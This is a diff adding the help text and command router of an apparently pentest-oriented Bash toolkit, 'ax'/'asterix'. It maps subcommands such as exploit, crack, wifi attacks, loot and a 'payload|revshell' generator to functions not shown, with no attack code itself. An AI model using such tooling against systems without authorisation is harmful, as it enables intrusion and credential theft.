+    echo -e "${C_WHITE}${C_BOLD}VAULT, WORKSPACE & DESKTOP HUD:${C_RESET}"
+    echo -e "  ${C_BLUE}ax backup${C_RESET}               Sync and compress vault to Discord and Cloud Panel"
+    echo -e "  ${C_BLUE}ax loot${C_RESET}                 Browse captured hashes, scan reports & intelligence"
+    echo -e "  ${C_BLUE}ax scaffold <lang> <name>${C_RESET} Scaffolds Rust, C, C++, Go, Python, or Node project"
+    echo -e "  ${C_BLUE}ax mem${C_RESET}                  Physical memory and ring buffer inspector"
+    echo -e "  ${C_BLUE}ax cpu${C_RESET}                  Inspect CPU microarchitecture and load average"
+    echo -e "  ${C_BLUE}ax disk${C_RESET}                 View disk partition mounts and capacity"
+    echo -e "  ${C_BLUE}ax ps${C_RESET}                   List active processes sorted by utilization"
+    echo -e "  ${C_BLUE}ax benchmark${C_RESET}            Run native CPU mathematics benchmark"
+    echo -e "  ${C_BLUE}ax wallpaper [random]${C_RESET}   Instantly cycle desktop cyberpunk wallpaper"
+    echo -e "  ${C_BLUE}ax hud [on|off|restart]${C_RESET} Toggle Conky desktop telemetry overlay"
+    echo -e "  ${C_BLUE}ax top${C_RESET}                  Launch Btop / Htop cyber resource monitor"
+    echo -e "  ${C_BLUE}ax compress <target>${C_RESET}    Create compressed tar archive"
+    echo -e "  ${C_BLUE}ax extract <archive>${C_RESET}    Automatically extract any archive format"
+    echo -e "  ${C_BLUE}ax find-large [dir]${C_RESET}     Find top 15 largest files on disk"
+    echo -e "  ${C_BLUE}ax disk-io${C_RESET}              Block device I/O throughput from /proc/diskstats"
+    echo -e "  ${C_BLUE}ax uptime-stats${C_RESET}         System uptime, load averages & session telemetry"
+    echo -e "  ${C_BLUE}ax battery${C_RESET}              Battery charge level, health & power supply state"
+    echo -e "  ${C_BLUE}ax pkg-verify${C_RESET}           Verify installed package integrity checksums\n"
+
+    echo -e "${C_WHITE}${C_BOLD}DIRECT CYBER SUBSYSTEM JUMPERS:${C_RESET}"
+    echo -e "  ${C_CYAN}ax recon${C_RESET}                01. Reconnaissance & OSINT"
+    echo -e "  ${C_CYAN}ax web${C_RESET}                  02. Web Application Warfare"
+    echo -e "  ${C_CYAN}ax exploit${C_RESET}              03. Exploitation & Payloads"
+    echo -e "  ${C_CYAN}ax crack${C_RESET}                04. Password & Hash Auditing"
+    echo -e "  ${C_CYAN}ax sniff${C_RESET}                05. Sniffing & Traffic Control"
+    echo -e "  ${C_CYAN}ax wifi${C_RESET}                 06. Wireless Attacks"
+    echo -e "  ${C_CYAN}ax forensics${C_RESET}            07. Digital Forensics & Stego"
+    echo -e "  ${C_CYAN}ax rev${C_RESET}                  08. Reverse Engineering (Radare2, GDB)"
+    echo -e "  ${C_CYAN}ax dev${C_RESET}                  09. Full-Stack Developer Studio"
+    echo -e "  ${C_CYAN}ax quad${C_RESET}                 11. Instant 4-Way Tmux Quad-Grid Cyber Studio"
+    echo -e "  ${C_CYAN}ax portal${C_RESET}               12. Web Operations Media Portal (port 7777)"
+    echo -e "  ${C_CYAN}ax discord${C_RESET}              Discord Remote Vault Bridge & Notifications"
+    echo -e "  ${C_CYAN}ax cloud${C_RESET}                Cloud Compute Worker Daemon"
+    echo -e "  ${C_CYAN}ax vault${C_RESET}                Jump directly to persistent storage"
+    echo -e "  ${C_CYAN}ax shell${C_RESET}                Spawn high-privilege cyber shell\n"
+
+    echo -e "${C_WHITE}${C_BOLD}INTERACTIVE COMMAND HUB:${C_RESET}"
+    echo -e "  Run ${C_YELLOW}ax${C_RESET} or ${C_YELLOW}asterix${C_RESET} with no parameters to launch the full Cybernetic Command Center.\n"
+}
+
+# ---------------------------------------------------------------------
+# Subsystem Dispatches to asterix-loader
+# ---------------------------------------------------------------------
+
+dispatch_loader() {
+    local flag="$1"
+    shift || true
+    if command -v asterix-loader >/dev/null 2>&1; then
+        exec asterix-loader "$flag" "$@"
+    elif [ -x "/usr/local/bin/asterix-loader" ]; then
+        exec /usr/local/bin/asterix-loader "$flag" "$@"
+    elif [ -x "ui-core/asterix-loader/target/release/asterix-loader" ]; then
+        exec ui-core/asterix-loader/target/release/asterix-loader "$flag" "$@"
+    else
+        echo -e "${C_YELLOW}[!] asterix-loader not yet compiled. Running fast fallback...${C_RESET}"
+        if [ -f "/etc/asterix/loading_screen.sh" ]; then
+            exec /etc/asterix/loading_screen.sh
+        fi
+    fi
+}
+
+# ---------------------------------------------------------------------
+# Universal Dynamic System Wrapper (Thousands of System Tools)
+# ---------------------------------------------------------------------
+
+dynamic_system_exec() {
+    local cmd="$1"
+    shift || true
+    if command -v "$cmd" >/dev/null 2>&1; then
+        echo -e "${C_CYAN}[*] ASTERIX Omni-Exec: ${C_WHITE}${cmd} ${*}${C_RESET}"
+        local start_ts
+        start_ts=$(date +%s%N 2>/dev/null || date +%s)
+        "$cmd" "$@"
+        local rc=$?
+        local end_ts
+        end_ts=$(date +%s%N 2>/dev/null || date +%s)
+        if [ $rc -eq 0 ]; then
+            echo -e "\n${C_GREEN}[✔] ${cmd} finished successfully.${C_RESET}"
+        else
+            echo -e "\n${C_YELLOW}[!] ${cmd} exited with status ${rc}.${C_RESET}"
+        fi
+        return $rc
+    else
+        echo -e "${C_RED}[!] Command '${cmd}' not recognized in ASTERIX OS.${C_RESET}"
+        echo -e "${C_YELLOW}[*] Try installing it via: ${C_WHITE}ax install ${cmd}${C_RESET}"
+        echo -e "${C_GRAY}[i] Type 'ax list' to browse all native suites or 'ax help' for reference.${C_RESET}"
+        return 127
+    fi
+}
+
+# ---------------------------------------------------------------------
+# Main CLI Router
+# ---------------------------------------------------------------------
+
+SUBCOMMAND="${1:-}"
+
+case "$SUBCOMMAND" in
+    # 1. System & Package Operations
+    update)
+        cmd_update
+        ;;
+    upgrade)
+        cmd_upgrade
+        ;;
+    install|add)
+        shift
+        cmd_install "$@"
+        ;;
+    remove|uninstall|rm)
+        shift
+        cmd_remove "$@"
+        ;;
+    search)
+        shift
+        cmd_search "$@"
+        ;;
+    clean|autoclean|autoremove)
+        cmd_clean
+        ;;
+    build|compile)
+        shift
+        cmd_build "$@"
+        ;;
+    doctor|check)
+        cmd_doctor
+        ;;
+    status|info|sysinfo|telemetry)
+        cmd_status
+        ;;
+    version|-v|--version)
+        cmd_version
+        ;;
+    help|-h|--help)
+        cmd_help
+        ;;
+    list|commands)
+        cmd_list
+        ;;
+
+    # 2. Network & Connectivity
+    ip|myip)
+        cmd_ip
+        ;;
+    ports|listen)
+        cmd_ports
+        ;;
+    ping)
+        shift
+        cmd_ping "$@"
+        ;;
+    scan)
+        shift
+        cmd_scan "$@"
+        ;;
+    netrecon)
+        shift
+        cmd_netrecon "$@"
+        ;;
+    mac)
+        shift
+        cmd_mac "$@"
+        ;;
+    webrecon)
+        shift
+        cmd_webrecon "$@"
+        ;;
+    dns|dig)
+        shift
+        cmd_dns "$@"
+        ;;
+    whois)
+        shift
+        cmd_whois "$@"
+        ;;
+    traceroute|tracepath)
+        shift
+        cmd_traceroute "$@"
+        ;;
+    arp)
+        cmd_arp
+        ;;
+    connections|conns)
+        cmd_connections
+        ;;
+    subdomains|subenum)
+        shift
+        cmd_subdomains "$@"
+        ;;
+    banner-grab|grab)
+        shift
+        cmd_banner_grab "$@"
+        ;;
+    wifi-scan|airmon)
+        cmd_wifi_scan
+        ;;
+    sniff-live|pcap)
+        shift
+        cmd_sniff_live "$@"
+        ;;
+    speedtest|bandwidth)
+        cmd_speedtest
+        ;;
+    traffic|netstat-live)
+        cmd_traffic
+        ;;
+    ip-geo)
+        shift
+        cmd_ip_geo "$@"
+        ;;
+    net-route)
+        cmd_net_route
+        ;;
+    listening|ports-deep)
+        cmd_listening
+        ;;
+
+    # 3. Security, Defense & Forensics
+    hash)
+        shift
+        cmd_hash "$@"
+        ;;
+    shred)
+        shift
+        cmd_shred "$@"
+        ;;
+    rootkit)
+        cmd_rootkit
+        ;;
+    trace|proctrace)
+        shift
+        cmd_trace "$@"
+        ;;
+    vuln|vulnscan)
+        shift
+        cmd_vuln "$@"
+        ;;
+    packet|packetcraft)
+        shift
+        cmd_packet "$@"
+        ;;
+    logwatch)
+        shift
+        cmd_logwatch "$@"
+        ;;
+    firewall|ufw|iptables)
+        cmd_firewall
+        ;;
+    audit|hardening)
+        cmd_audit
+        ;;
+    suid)
+        cmd_suid
+        ;;
+    certs|ssl)
+        shift
+        cmd_certs "$@"
+        ;;
+    stealth|ghost)
+        cmd_stealth
+        ;;
+    killswitch|lockdown)
+        shift
+        cmd_killswitch "$@"
+        ;;
+    malware-scan|webshell)
+        shift
+        cmd_malware_scan "$@"
+        ;;
+    docker-audit|container)
+        cmd_docker_audit
+        ;;
+    tor-status|tor|onion)
+        cmd_tor_status
+        ;;
+    kernel-hardening|sysctl-check)
+        cmd_kernel_hardening
+        ;;
+    fim-init)
+        cmd_fim_init
+        ;;
+    fim-check)
+        cmd_fim_check
+        ;;
+    auth-audit)
+        cmd_auth_audit
+        ;;
+    git-secrets|secrets)
+        shift
+        cmd_git_secrets "$@"
+        ;;
+    cis-audit|compliance)
+        cmd_cis_audit
+        ;;
+    tls-audit|cert-check)
+        shift
+        cmd_tls_audit "$@"
+        ;;
+    cron-audit|timers)
+        cmd_cron_audit
+        ;;
+
+    # 4. Tactical Cyber Operations & Deception
+    matrix)
+        cmd_matrix
+        ;;
+    decoy|honeypot)
+        shift
+        cmd_decoy "$@"
+        ;;
+    payload|revshell)
+        shift
+        cmd_payload "$@"
+        ;;
+    quote|ethos)
+        cmd_quote
+        ;;
+
+    # 5. Encoding, Crypto & Passwords
+    encrypt|enc)
+        shift
+        cmd_encrypt "$@"
+        ;;
+    decrypt|dec)
+        shift
+        cmd_decrypt "$@"
+        ;;
+    b64enc|base64-enc)
+        shift
+        cmd_b64enc "$@"
+        ;;
+    b64dec|base64-dec)
+        shift
+        cmd_b64dec "$@"
+        ;;
+    hexenc|hex-enc)
+        shift
+        cmd_hexenc "$@"
+        ;;
+    hexdec|hex-dec)
+        shift
+        cmd_hexdec "$@"
+        ;;
+    genpass|password)
+        shift
+        cmd_genpass "$@"
+        ;;
+    entropy)
+        shift
+        cmd_entropy "$@"
+        ;;
+    qr|qrcode)
+        shift
+        cmd_qr "$@"
+        ;;
+    cert-create|self-cert)
+        shift
+        cmd_cert_create "$@"
+        ;;
+    json-format|json)
+        shift
+        cmd_json_format "$@"
+        ;;
+
+    # 6. System, Hardware & Monitoring
+    cpu|cpuinfo)
+        cmd_cpu
+        ;;
+    disk|df)
+        cmd_disk
+        ;;
+    mem|ram)
+        cmd_mem
+        ;;
+    service|systemctl)
+        shift
+        cmd_service "$@"
+        ;;
+    ps|procs)
+        cmd_ps
+        ;;
+    benchmark|bench)
+        cmd_benchmark
+        ;;
+    env)
+        cmd_env
+        ;;
+    top|htop|btop)
+        cmd_top
+        ;;
+    sysfetch|neofetch|fetch)
+        cmd_sysfetch
+        ;;
+    pstree|process-tree)
+        cmd_process_tree
+        ;;
+    env-audit)
+        cmd_env_audit
+        ;;
+    disk-io|iostats)
+        cmd_disk_io
+        ;;
+    uptime-stats|loadavg)
+        cmd_uptime_stats
+        ;;
+    battery|power)
+        cmd_battery
+        ;;
+    pkg-verify|debsums)
+        cmd_pkg_verify
+        ;;
+
+    # Subsystem: Advanced Offensive & Forensics (v2.8.0)
+    ssh-audit|sshd-audit)
+        cmd_ssh_audit
+        ;;
+    arp-detect|arp-spoof)
+        cmd_arp_detect
+        ;;
+    hexdump|xxd)
+        shift
+        cmd_hexdump "$@"
+        ;;
+    strings-scan|strings)
+        shift
+        cmd_strings_scan "$@"
+        ;;
+    shadow-audit|passwd-audit)
+        cmd_shadow_audit
+        ;;
+    usb-audit|usb)
+        cmd_usb_audit
+        ;;
+    dmesg-watch|klog)
+        cmd_dmesg_watch
+        ;;
+    net-neighbors|neigh|arp-table)
+        cmd_net_neighbors
+        ;;
+    nft-rules|firewall-rules|iptables)
+        cmd_nft_rules
+        ;;
+    syscall-trace|strace)
+        shift
+        cmd_syscall_trace "$@"
+        ;;
+    open-files|lsof)
+        shift
+        cmd_open_files "$@"
+        ;;
+    container-escape|escape-check)
+        cmd_container_escape
+        ;;
+    port-knock|knock)
+        shift
+        cmd_port_knock "$@"
+        ;;
+    mem-regions|memmap)
+        shift
+        cmd_mem_regions "$@"
+        ;;
+
+    # 7. Vault, Workspace & Desktop HUD
+    backup)
+        shift
+        cmd_backup "$@"
+        ;;
+    loot)
+        cmd_loot
+        ;;
+    scaffold|new)
+        shift
+        cmd_scaffold "$@"
+        ;;
+    wallpaper|wp)
+        shift
+        cmd_wallpaper "$@"
+        ;;
+    hud)
+        shift
+        cmd_hud "$@"
+        ;;
+    compress|tar)
+        shift
+        cmd_compress "$@"
+        ;;
+    extract|untar)
+        shift
+        cmd_extract "$@"
+        ;;
+    find-large|bigfiles)
+        shift
+        cmd_find_large "$@"
+        ;;
+    exif|metadata)
+        shift
+        cmd_exif "$@"
+        ;;
+
+    # 8. Direct Cyber Subsystem Jumpers
+    recon|--recon)
+        dispatch_loader "--recon"
+        ;;
+    web|web-audit|--web-audit)
+        dispatch_loader "--web-audit"
+        ;;
+    exploit|--exploit)
+        dispatch_loader "--exploit"
+        ;;
+    crack|passwords|--passwords)
+        dispatch_loader "--passwords"
+        ;;
+    sniff|sniffing|--sniffing)
+        dispatch_loader "--sniffing"
+        ;;
+    wifi|wireless|--wireless)
+        dispatch_loader "--wireless"
+        ;;
+    forensics|forensic|--forensics)
+        dispatch_loader "--forensics"
+        ;;
+    rev|reverse|--reverse)
+        dispatch_loader "--reverse"
+        ;;
+    dev|--dev)
+        dispatch_loader "--dev"
+        ;;
+    quad|--quad)
+        dispatch_loader "--quad"
+        ;;
+    portal|--portal)
+        dispatch_loader "--portal"
+        ;;
+    discord|--discord)
+        dispatch_loader "--discord"
+        ;;
+    cloud|--cloud)
+        if [ -f "/etc/asterix/cloud-panel/asterix-cloud-worker.py" ]; then
+            python3 /etc/asterix/cloud-panel/asterix-cloud-worker.py "$@"
+        elif [ -f "cloud-panel/asterix-cloud-worker.py" ]; then
+            python3 cloud-panel/asterix-cloud-worker.py "$@"
+        else
+            echo -e "${C_RED}[!] Cloud worker script not found.${C_RESET}"
+        fi
+        ;;
+    vault)
+        if [ -d "/asterix_persistent" ]; then
+            cd "/asterix_persistent" && exec "${SHELL:-/bin/bash}"
+        elif [ -d "$HOME/asterix_persistent" ]; then
+            cd "$HOME/asterix_persistent" && exec "${SHELL:-/bin/bash}"
+        else
+            echo -e "${C_YELLOW}[!] Persistent vault not connected.${C_RESET}"
+        fi
+        ;;
+    shell)
+        exec "${SHELL:-/bin/bash}"
+        ;;
+    "")
+        # No argument -> Launch interactive Cyber Command Center
+        dispatch_loader "--menu"
+        ;;
+    *)
+        # If flag starts with --, forward to loader
+        if [[ "$SUBCOMMAND" == --* ]]; then
+            dispatch_loader "$@"
+        else
+            # Dynamic Universal OS Dispatcher
+            dynamic_system_exec "$@"
+        fi
+        ;;
+esac
